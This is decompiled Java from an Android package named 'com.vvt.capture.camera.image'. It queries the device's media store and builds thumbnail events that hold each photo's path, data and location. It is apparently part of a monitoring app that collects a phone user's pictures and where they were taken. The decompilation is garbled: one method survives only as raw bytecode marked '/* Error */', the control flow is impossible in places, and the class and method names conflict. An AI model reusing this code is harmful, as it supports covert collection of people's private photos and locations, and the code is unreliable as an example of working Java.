package com.vvt.capture.camera.image.b;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import com.vvt.ak.a;
import com.vvt.events.FxCameraImageThumbnailEvent;
import com.vvt.events.FxMediaType;
import com.vvt.events.c;
import com.vvt.io.d;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;

public class b
{
  private static final boolean a;
  private static final boolean b;
  
  static
  {
    boolean bool1 = true;
    boolean bool2 = a.a;
    if (bool2)
    {
      bool2 = bool1;
      a = bool2;
      bool2 = a.e;
      if (!bool2) {
        break label34;
      }
    }
    for (;;)
    {
      b = bool1;
      return;
      bool2 = false;
      break;
      label34:
      bool1 = false;
    }
  }
  
  public static FxCameraImageThumbnailEvent a(com.vvt.capture.camera.image.b paramb)
  {
    FxCameraImageThumbnailEvent localFxCameraImageThumbnailEvent = new com/vvt/events/FxCameraImageThumbnailEvent;
    localFxCameraImageThumbnailEvent.<init>();
    long l = paramb.a();
    localFxCameraImageThumbnailEvent.setEventId(l);
    l = paramb.h();
    localFxCameraImageThumbnailEvent.setEventTime(l);
    l = paramb.d();
    localFxCameraImageThumbnailEvent.setActualSize(l);
    Object localObject = paramb.b();
    localFxCameraImageThumbnailEvent.setFormat((FxMediaType)localObject);
    l = paramb.a();
    localFxCameraImageThumbnailEvent.setParingId(l);
    localObject = paramb.c();
    localFxCameraImageThumbnailEvent.setData((byte[])localObject);
    localObject = paramb.f();
    localFxCameraImageThumbnailEvent.setActualFullPath((String)localObject);
    localObject = paramb.g();
    localFxCameraImageThumbnailEvent.setThumbnailFullPath((String)localObject);
    localObject = paramb.e();
    localFxCameraImageThumbnailEvent.setGeo((c)localObject);
    return localFxCameraImageThumbnailEvent;
  }
  
  public static List a(ContentResolver paramContentResolver, Uri paramUri)
  {
    localObject1 = null;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    if (paramUri == null) {}
    for (;;)
    {
      try
      {
        NullPointerException localNullPointerException1 = new java/lang/NullPointerException;
        localObject4 = "url can not be null";
        localNullPointerException1.<init>((String)localObject4);
        throw localNullPointerException1;
      }
      catch (Exception localException1)
      {
        localException1 = localException1;
        i = 0;
        NullPointerException localNullPointerException2 = null;
        try
        {
          bool = b;
          if ((!bool) || (localNullPointerException2 != null)) {
            localNullPointerException2.close();
          }
          return localArrayList;
        }
        finally
        {
          for (;;)
          {
            boolean bool;
            String[] arrayOfString;
            localObject1 = localObject3;
            Object localObject3 = localObject5;
          }
        }
        if (paramContentResolver != null) {
          break label103;
        }
        localNullPointerException2 = new java/lang/NullPointerException;
        localObject4 = "contentResolver can not be null";
        localNullPointerException2.<init>((String)localObject4);
        throw localNullPointerException2;
      }
      finally {}
      if (localObject1 != null) {
        ((Cursor)localObject1).close();
      }
      throw ((Throwable)localObject2);
      label103:
      int i = 1;
      arrayOfString = new String[i];
      i = 0;
      localObject3 = null;
      Object localObject4 = "_id";
      arrayOfString[0] = localObject4;
      localObject3 = paramContentResolver;
      localObject4 = paramUri;
      localObject3 = paramContentResolver.query(paramUri, arrayOfString, null, null, null);
      if (localObject3 != null) {
        try
        {
          for (;;)
          {
            bool = ((Cursor)localObject3).moveToNext();
            if (!bool) {
              break;
            }
            localObject4 = "_id";
            int j = ((Cursor)localObject3).getColumnIndex((String)localObject4);
            long l = ((Cursor)localObject3).getLong(j);
            localObject4 = Long.valueOf(l);
            localArrayList.add(localObject4);
          }
        }
        catch (Exception localException2) {}
      } else if (localObject3 == null) {}
    }
  }
  
  public static List a(ContentResolver paramContentResolver, Uri paramUri, int paramInt, long paramLong)
  {
    localObject1 = null;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    if (paramUri == null) {}
    for (;;)
    {
      try
      {
        NullPointerException localNullPointerException1 = new java/lang/NullPointerException;
        localObject4 = "url can not be null";
        localNullPointerException1.<init>((String)localObject4);
        throw localNullPointerException1;
      }
      catch (Exception localException1)
      {
        localException1 = localException1;
        i = 0;
        NullPointerException localNullPointerException2 = null;
        try
        {
          boolean bool1 = b;
          if ((!bool1) || (localNullPointerException2 != null)) {
            localNullPointerException2.close();
          }
          return localArrayList;
        }
        finally
        {
          for (;;)
          {
            String[] arrayOfString;
            int j;
            int m;
            String str1;
            Object localObject6;
            String str2;
            boolean bool5;
            localObject1 = localObject3;
            Object localObject3 = localObject5;
          }
        }
        if (paramContentResolver != null) {
          break label109;
        }
        localNullPointerException2 = new java/lang/NullPointerException;
        localObject4 = "contentResolver can not be null";
        localNullPointerException2.<init>((String)localObject4);
        throw localNullPointerException2;
      }
      finally {}
      if (localObject1 != null) {
        ((Cursor)localObject1).close();
      }
      throw ((Throwable)localObject2);
      label109:
      int i = -1;
      if (paramInt == i) {
        paramInt = -1 >>> 1;
      }
      i = 2;
      arrayOfString = new String[i];
      i = 0;
      localObject3 = null;
      Object localObject4 = "_id";
      arrayOfString[0] = localObject4;
      i = 1;
      localObject4 = "_data";
      arrayOfString[i] = localObject4;
      localObject3 = "%s < %d";
      j = 2;
      localObject4 = new Object[j];
      m = 0;
      str1 = null;
      localObject6 = "_size";
      localObject4[0] = localObject6;
      m = 1;
      localObject6 = Long.valueOf(paramLong);
      localObject4[m] = localObject6;
      str1 = String.format((String)localObject3, (Object[])localObject4);
      str2 = "date_modified DESC";
      bool5 = false;
      localObject6 = null;
      localObject3 = paramContentResolver;
      localObject4 = paramUri;
      localObject3 = paramContentResolver.query(paramUri, arrayOfString, str1, null, str2);
      if (localObject3 != null) {
        try
        {
          for (;;)
          {
            boolean bool2 = ((Cursor)localObject3).moveToNext();
            if (!bool2) {
              break;
            }
            localObject4 = "_id";
            int k = ((Cursor)localObject3).getColumnIndexOrThrow((String)localObject4);
            long l = ((Cursor)localObject3).getLong(k);
            str1 = "_data";
            m = ((Cursor)localObject3).getColumnIndexOrThrow(str1);
            str1 = ((Cursor)localObject3).getString(m);
            str1 = d.h(str1);
            bool5 = a;
            if (bool5) {}
            boolean bool4 = d.e(str1);
            if (!bool4)
            {
              boolean bool3 = a;
              if (!bool3) {}
            }
            else
            {
              int n = localArrayList.size();
              if (n >= paramInt) {
                break;
              }
              localObject4 = Long.valueOf(l);
              localArrayList.add(localObject4);
            }
          }
        }
        catch (Exception localException2) {}
      } else if (localObject3 == null) {}
    }
  }
  
  /* Error */
  private static List a(String paramString, ContentResolver paramContentResolver, Uri paramUri, long paramLong)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore 5
    //   3: aconst_null
    //   4: astore 6
    //   6: aconst_null
    //   7: astore 7
    //   9: getstatic 13	com/vvt/capture/camera/image/removeFromPath/removeFromPath:a	Z
    //   12: istore 8
    //   14: iload 8
    //   16: ifeq +3 -> 19
    //   19: aload_2
    //   20: ifnonnull +18 -> 38
    //   23: new 89	java/lang/NullPointerException
    //   26: astore 9
    //   28: aload 9
    //   30: ldc 91
    //   32: invokespecial 93	java/lang/NullPointerException:<init>	(Ljava/lang/String;)V
    //   35: aload 9
    //   37: athrow
    //   38: new 86	java/util/ArrayList
    //   41: astore 10
    //   43: aload 10
    //   45: invokespecial 87	java/util/ArrayList:<init>	()V
    //   48: aload_1
    //   49: ifnonnull +18 -> 67
    //   52: new 89	java/lang/NullPointerException
    //   55: astore 9
    //   57: aload 9
    //   59: ldc 100
    //   61: invokespecial 93	java/lang/NullPointerException:<init>	(Ljava/lang/String;)V
    //   64: aload 9
    //   66: athrow
    //   67: iconst_2
    //   68: istore 11
    //   70: iload 11
    //   72: anewarray 4	java/lang/Object
    //   75: astore 12
    //   77: aload 12
    //   79: iconst_0
    //   80: ldc 104
    //   82: aastore
    //   83: lload_3
    //   84: invokestatic 128	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   87: astore 6
    //   89: aload 12
    //   91: iconst_1
    //   92: aload 6
    //   94: aastore
    //   95: ldc -86
    //   97: aload 12
    //   99: invokestatic 147	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   102: astore 6
    //   104: aconst_null
    //   105: astore 13
    //   107: iconst_0
    //   108: istore 14
    //   110: aconst_null
    //   111: astore 15
    //   113: aconst_null
    //   114: astore 16
    //   116: aload_1
    //   117: astore 9
    //   119: aload_2
    //   120: astore 12
    //   122: aload_1
    //   123: aload_2
    //   124: aconst_null
    //   125: aload 6
    //   127: aconst_null
    //   128: aconst_null
    //   129: invokevirtual 110	android/content/ContentResolver:query	(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   132: astore 9
    //   134: aload 9
    //   136: ifnull +481 -> 617
    //   139: iconst_0
    //   140: istore 11
    //   142: aconst_null
    //   143: astore 12
    //   145: iconst_0
    //   146: newarray <illegal type>
    //   148: astore 13
    //   150: aload 9
    //   152: invokeinterface 114 1 0
    //   157: istore 11
    //   159: iload 11
    //   161: ifeq +466 -> 627
    //   164: ldc 104
    //   166: astore 12
    //   168: aload 9
    //   170: aload 12
    //   172: invokeinterface 152 2 0
    //   177: istore 11
    //   179: aload 9
    //   181: iload 11
    //   183: invokeinterface 174 2 0
    //   188: istore 5
    //   190: ldc -117
    //   192: astore 12
    //   194: aload 9
    //   196: aload 12
    //   198: invokeinterface 152 2 0
    //   203: istore 11
    //   205: aload 9
    //   207: iload 11
    //   209: invokeinterface 156 2 0
    //   214: astore 12
    //   216: ldc -80
    //   218: astore 15
    //   220: aload 9
    //   222: aload 15
    //   224: invokeinterface 152 2 0
    //   229: istore 14
    //   231: aload 9
    //   233: iload 14
    //   235: invokeinterface 156 2 0
    //   240: astore 15
    //   242: aload 15
    //   244: invokestatic 181	com/vvt/events/f:a	(Ljava/lang/String;)Lcom/vvt/events/FxMediaType;
    //   247: astore 15
    //   249: new 183	java/util/Date
    //   252: astore 16
    //   254: aload 16
    //   256: invokespecial 184	java/util/Date:<init>	()V
    //   259: aload 16
    //   261: invokevirtual 187	java/util/Date:getTime	()J
    //   264: lstore 17
    //   266: ldc -113
    //   268: astore 19
    //   270: aload 9
    //   272: aload 19
    //   274: invokeinterface 152 2 0
    //   279: istore 20
    //   281: aload 9
    //   283: iload 20
    //   285: invokeinterface 174 2 0
    //   290: istore 20
    //   292: aload 12
    //   294: invokestatic 161	com/vvt/io/d:AppEngine1	(Ljava/lang/String;)Ljava/lang/String;
    //   297: astore 12
    //   299: getstatic 13	com/vvt/capture/camera/image/removeFromPath/removeFromPath:a	Z
    //   302: istore 21
    //   304: iload 21
    //   306: ifeq +3 -> 309
    //   309: aload 12
    //   311: invokestatic 164	com/vvt/io/d:e	(Ljava/lang/String;)Z
    //   314: istore 21
    //   316: iload 21
    //   318: ifne +16 -> 334
    //   321: getstatic 13	com/vvt/capture/camera/image/removeFromPath/removeFromPath:a	Z
    //   324: istore 11
    //   326: iload 11
    //   328: ifeq -178 -> 150
    //   331: goto -181 -> 150
    //   334: new 26	com/vvt/capture/camera/image/removeFromPath
    //   337: astore 22
    //   339: aload 22
    //   341: invokespecial 188	com/vvt/capture/camera/image/removeFromPath:<init>	()V
    //   344: aload 22
    //   346: lload 17
    //   348: invokevirtual 190	com/vvt/capture/camera/image/removeFromPath:MyUncaughtExceptionHandler	(J)V
    //   351: iload 20
    //   353: i2l
    //   354: lstore 17
    //   356: aload 22
    //   358: lload 17
    //   360: invokevirtual 192	com/vvt/capture/camera/image/removeFromPath:removeFromPath	(J)V
    //   363: aload 22
    //   365: aload 15
    //   367: invokevirtual 194	com/vvt/capture/camera/image/removeFromPath:a	(Lcom/vvt/events/FxMediaType;)V
    //   370: iload 5
    //   372: i2l
    //   373: lstore 23
    //   375: aload 22
    //   377: lload 23
    //   379: invokevirtual 196	com/vvt/capture/camera/image/removeFromPath:a	(J)V
    //   382: aload 22
    //   384: aload 13
    //   386: invokevirtual 198	com/vvt/capture/camera/image/removeFromPath:a	([B)V
    //   389: aload 22
    //   391: aload 12
    //   393: invokevirtual 200	com/vvt/capture/camera/image/removeFromPath:a	(Ljava/lang/String;)V
    //   396: sipush 800
    //   399: istore 14
    //   401: aload 12
    //   403: aload_0
    //   404: iload 14
    //   406: invokestatic 206	com/vvt/io/o:a	(Ljava/lang/String;Ljava/lang/String;I)Ljava/lang/String;
    //   409: astore 12
    //   411: aload 12
    //   413: ifnonnull +34 -> 447
    //   416: getstatic 13	com/vvt/capture/camera/image/removeFromPath/removeFromPath:a	Z
    //   419: istore 11
    //   421: iload 11
    //   423: ifeq +3 -> 426
    //   426: iload 5
    //   428: i2l
    //   429: lstore 25
    //   431: sipush 800
    //   434: istore 11
    //   436: aload_0
    //   437: lload 25
    //   439: aload_1
    //   440: iload 11
    //   442: invokestatic 209	com/vvt/io/o:a	(Ljava/lang/String;JLandroid/content/ContentResolver;I)Ljava/lang/String;
    //   445: astore 12
    //   447: getstatic 13	com/vvt/capture/camera/image/removeFromPath/removeFromPath:a	Z
    //   450: istore 5
    //   452: iload 5
    //   454: ifeq +3 -> 457
    //   457: getstatic 13	com/vvt/capture/camera/image/removeFromPath/removeFromPath:a	Z
    //   460: istore 5
    //   462: iload 5
    //   464: ifeq +3 -> 467
    //   467: aload 22
    //   469: aload 12
    //   471: invokevirtual 211	com/vvt/capture/camera/image/removeFromPath:removeFromPath	(Ljava/lang/String;)V
    //   474: ldc -43
    //   476: astore 12
    //   478: aload 9
    //   480: aload 12
    //   482: invokeinterface 152 2 0
    //   487: istore 11
    //   489: aload 9
    //   491: iload 11
    //   493: invokeinterface 217 2 0
    //   498: dstore 27
    //   500: ldc -37
    //   502: astore 12
    //   504: aload 9
    //   506: aload 12
    //   508: invokeinterface 152 2 0
    //   513: istore 11
    //   515: aload 9
    //   517: iload 11
    //   519: invokeinterface 217 2 0
    //   524: dstore 29
    //   526: new 221	com/vvt/events/MyUncaughtExceptionHandler
    //   529: astore 12
    //   531: aload 12
    //   533: invokespecial 222	com/vvt/events/MyUncaughtExceptionHandler:<init>	()V
    //   536: aload 12
    //   538: dload 27
    //   540: invokevirtual 225	com/vvt/events/MyUncaughtExceptionHandler:a	(D)V
    //   543: aload 12
    //   545: dload 29
    //   547: invokevirtual 227	com/vvt/events/MyUncaughtExceptionHandler:removeFromPath	(D)V
    //   550: aload 22
    //   552: aload 12
    //   554: invokevirtual 229	com/vvt/capture/camera/image/removeFromPath:a	(Lcom/vvt/events/MyUncaughtExceptionHandler;)V
    //   557: aload 10
    //   559: aload 22
    //   561: invokeinterface 134 2 0
    //   566: pop
    //   567: goto -417 -> 150
    //   570: astore 12
    //   572: getstatic 18	com/vvt/capture/camera/image/removeFromPath/removeFromPath:removeFromPath	Z
    //   575: istore 11
    //   577: iload 11
    //   579: ifeq +3 -> 582
    //   582: aload 9
    //   584: ifnull +10 -> 594
    //   587: aload 9
    //   589: invokeinterface 98 1 0
    //   594: getstatic 13	com/vvt/capture/camera/image/removeFromPath/removeFromPath:a	Z
    //   597: istore 8
    //   599: iload 8
    //   601: ifeq +3 -> 604
    //   604: getstatic 13	com/vvt/capture/camera/image/removeFromPath/removeFromPath:a	Z
    //   607: istore 8
    //   609: iload 8
    //   611: ifeq +3 -> 614
    //   614: aload 10
    //   616: areturn
    //   617: getstatic 18	com/vvt/capture/camera/image/removeFromPath/removeFromPath:removeFromPath	Z
    //   620: istore 11
    //   622: iload 11
    //   624: ifeq +3 -> 627
    //   627: aload 9
    //   629: ifnull -35 -> 594
    //   632: goto -45 -> 587
    //   635: astore 9
    //   637: aload 7
    //   639: ifnull +10 -> 649
    //   642: aload 7
    //   644: invokeinterface 98 1 0
    //   649: aload 9
    //   651: athrow
    //   652: astore 12
    //   654: aload 9
    //   656: astore 7
    //   658: aload 12
    //   660: astore 9
    //   662: goto -25 -> 637
    //   665: astore 9
    //   667: iconst_0
    //   668: istore 8
    //   670: aconst_null
    //   671: astore 9
    //   673: goto -101 -> 572
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	676	0	paramString	String
    //   0	676	1	paramContentResolver	ContentResolver
    //   0	676	2	paramUri	Uri
    //   0	676	3	paramLong	long
    //   1	426	5	i	int
    //   450	13	5	bool1	boolean
    //   4	122	6	localObject1	Object
    //   7	650	7	localObject2	Object
    //   12	657	8	bool2	boolean
    //   26	602	9	localObject3	Object
    //   635	20	9	localObject4	Object
    //   660	1	9	localObject5	Object
    //   665	1	9	localException1	Exception
    //   671	1	9	localObject6	Object
    //   41	574	10	localArrayList	ArrayList
    //   68	73	11	j	int
    //   157	3	11	bool3	boolean
    //   177	31	11	k	int
    //   324	98	11	bool4	boolean
    //   434	84	11	m	int
    //   575	48	11	bool5	boolean
    //   75	478	12	localObject7	Object
    //   570	1	12	localException2	Exception
    //   652	7	12	localObject8	Object
    //   105	280	13	arrayOfByte	byte[]
    //   108	297	14	n	int
    //   111	255	15	localObject9	Object
    //   114	146	16	localDate	java.util.Date
    //   264	95	17	l1	long
    //   268	5	19	str	String
    //   279	73	20	i1	int
    //   302	15	21	bool6	boolean
    //   337	223	22	localb	com.vvt.capture.camera.image.removeFromPath
    //   373	5	23	l2	long
    //   429	9	25	l3	long
    //   498	41	27	d1	double
    //   524	22	29	d2	double
    // Exception table:
    //   from	to	target	type
    //   145	148	570	java/lang/Exception
    //   150	157	570	java/lang/Exception
    //   170	177	570	java/lang/Exception
    //   181	188	570	java/lang/Exception
    //   196	203	570	java/lang/Exception
    //   207	214	570	java/lang/Exception
    //   222	229	570	java/lang/Exception
    //   233	240	570	java/lang/Exception
    //   242	247	570	java/lang/Exception
    //   249	252	570	java/lang/Exception
    //   254	259	570	java/lang/Exception
    //   259	264	570	java/lang/Exception
    //   272	279	570	java/lang/Exception
    //   283	290	570	java/lang/Exception
    //   292	297	570	java/lang/Exception
    //   299	302	570	java/lang/Exception
    //   309	314	570	java/lang/Exception
    //   321	324	570	java/lang/Exception
    //   334	337	570	java/lang/Exception
    //   339	344	570	java/lang/Exception
    //   346	351	570	java/lang/Exception
    //   358	363	570	java/lang/Exception
    //   365	370	570	java/lang/Exception
    //   377	382	570	java/lang/Exception
    //   384	389	570	java/lang/Exception
    //   391	396	570	java/lang/Exception
    //   404	409	570	java/lang/Exception
    //   416	419	570	java/lang/Exception
    //   440	445	570	java/lang/Exception
    //   447	450	570	java/lang/Exception
    //   457	460	570	java/lang/Exception
    //   469	474	570	java/lang/Exception
    //   480	487	570	java/lang/Exception
    //   491	498	570	java/lang/Exception
    //   506	513	570	java/lang/Exception
    //   517	524	570	java/lang/Exception
    //   526	529	570	java/lang/Exception
    //   531	536	570	java/lang/Exception
    //   538	543	570	java/lang/Exception
    //   545	550	570	java/lang/Exception
    //   552	557	570	java/lang/Exception
    //   559	567	570	java/lang/Exception
    //   617	620	570	java/lang/Exception
    //   128	132	635	finally
    //   145	148	652	finally
    //   150	157	652	finally
    //   170	177	652	finally
    //   181	188	652	finally
    //   196	203	652	finally
    //   207	214	652	finally
    //   222	229	652	finally
    //   233	240	652	finally
    //   242	247	652	finally
    //   249	252	652	finally
    //   254	259	652	finally
    //   259	264	652	finally
    //   272	279	652	finally
    //   283	290	652	finally
    //   292	297	652	finally
    //   299	302	652	finally
    //   309	314	652	finally
    //   321	324	652	finally
    //   334	337	652	finally
    //   339	344	652	finally
    //   346	351	652	finally
    //   358	363	652	finally
    //   365	370	652	finally
    //   377	382	652	finally
    //   384	389	652	finally
    //   391	396	652	finally
    //   404	409	652	finally
    //   416	419	652	finally
    //   440	445	652	finally
    //   447	450	652	finally
    //   457	460	652	finally
    //   469	474	652	finally
    //   480	487	652	finally
    //   491	498	652	finally
    //   506	513	652	finally
    //   517	524	652	finally
    //   526	529	652	finally
    //   531	536	652	finally
    //   538	543	652	finally
    //   545	550	652	finally
    //   552	557	652	finally
    //   559	567	652	finally
    //   572	575	652	finally
    //   617	620	652	finally
    //   128	132	665	java/lang/Exception
  }
  
  public static List a(String paramString, ContentResolver paramContentResolver, Uri paramUri, List paramList1, List paramList2)
  {
    boolean bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    if ((paramList1 == null) || (paramList2 == null)) {}
    for (Object localObject = localArrayList;; localObject = localArrayList)
    {
      return (List)localObject;
      Iterator localIterator = paramList2.iterator();
      for (;;)
      {
        bool = localIterator.hasNext();
        if (!bool) {
          break;
        }
        long l = ((Long)localIterator.next()).longValue();
        localObject = Long.valueOf(l);
        bool = paramList1.contains(localObject);
        if (!bool)
        {
          bool = a;
          if (bool) {}
          localObject = a(paramString, paramContentResolver, paramUri, l);
          localArrayList.addAll((Collection)localObject);
        }
      }
      bool = a;
      if (!bool) {}
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/camera/image/removeFromPath/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */